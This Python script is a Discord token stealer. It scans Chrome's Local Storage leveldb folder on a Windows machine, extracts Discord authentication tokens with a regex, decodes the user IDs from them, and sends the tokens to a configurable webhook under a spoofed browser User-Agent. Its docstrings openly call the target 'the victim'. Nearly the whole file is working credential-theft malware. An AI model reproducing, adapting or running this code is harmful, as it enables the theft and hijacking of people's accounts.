# ruff: noqa: INP001
import base64
import json
import os
import re
import urllib.request
from pathlib import Path

TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
}
WEBHOOK_URL = "YOUR WEBHOOK URL"


def make_post_request(api_url: str, data: dict[str, str]) -> int:
    if not api_url.startswith(("http", "https")):
        raise ValueError

    request = urllib.request.Request(  # noqa: S310
        api_url, data=json.dumps(data).encode(),
        headers=REQUEST_HEADERS,
    )

    with urllib.request.urlopen(request) as response:  # noqa: S310
        return response.status


def get_tokens_from_file(file_path: Path) -> list[str] | None:

    try:
        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
    except PermissionError:
        return None

    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)

    return tokens or None


def get_user_id_from_token(token: str) -> str | None:
    """Confirm that the portion of a string before the first dot can be decoded.

    Decoding from base64 offers a useful, though not infallible, method for identifying
    potential Discord tokens. This is informed by the fact that the initial
    segment of a Discord token usually encodes the user ID in base64. However,
    this test is not guaranteed to be 100% accurate in every case.

    Returns
    -------
        A string representing the Discord user ID to which the token belongs,
        if the first part of the token can be successfully decoded. Otherwise,
        None.

    """
    try:
        discord_user_id = base64.b64decode(
            token.split(".", maxsplit=1)[0] + "==",
        ).decode("utf-8")
    except UnicodeDecodeError:
        return None

    return discord_user_id


def get_tokens_from_path(base_path: Path) -> dict[str, set]:
    """Collect discord tokens for each user ID.

    to manage the occurrence of both valid and expired Discord tokens, which happens when a
    user updates their password, triggering a change in their token. Lacking
    the capability to differentiate between valid and expired tokens without
    making queries to the Discord API, the function compiles every discovered
    token into the returned set. It is designed for these tokens to be
    validated later, in a process separate from the initial collection and not
    on the victim's machine.

    Returns
    -------
        user id mapped to a set of potential tokens

    """
    file_paths = [file for file in base_path.iterdir() if file.is_file()]

    id_to_tokens: dict[str, set] = {}

    for file_path in file_paths:
        potential_tokens = get_tokens_from_file(file_path)

        if potential_tokens is None:
            continue

        for potential_token in potential_tokens:
            discord_user_id = get_user_id_from_token(potential_token)

            if discord_user_id is None:
                continue

            if discord_user_id not in id_to_tokens:
                id_to_tokens[discord_user_id] = set()

            id_to_tokens[discord_user_id].add(potential_token)

    return id_to_tokens or None


def send_tokens_to_webhook(
    webhook_url: str, user_id_to_token: dict[str, set[str]],
) -> int:
    """Caution: In scenarios where the victim has logged into multiple Discord
    accounts or has frequently changed their password, the accumulation of
    tokens may result in a message that surpasses the character limit,
    preventing it from being sent. There are no plans to introduce code
    modifications to segment the message for compliance with character
    constraints.
    """  # noqa: D205
    fields: list[dict] = []

    for user_id, tokens in user_id_to_token.items():
        fields.append({
            "name": user_id,
            "value": "\n".join(tokens),
        })

    data = {"content": "Found tokens", "embeds": [{"fields": fields}]}

    make_post_request(webhook_url, data)


def main() -> None:

    chrome_path = (
        Path(os.getenv("LOCALAPPDATA")) /
        "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
    )
    tokens = get_tokens_from_path(chrome_path)

    if tokens is None:
        return

    send_tokens_to_webhook(WEBHOOK_URL, tokens)


if __name__ == "__main__":
    main()
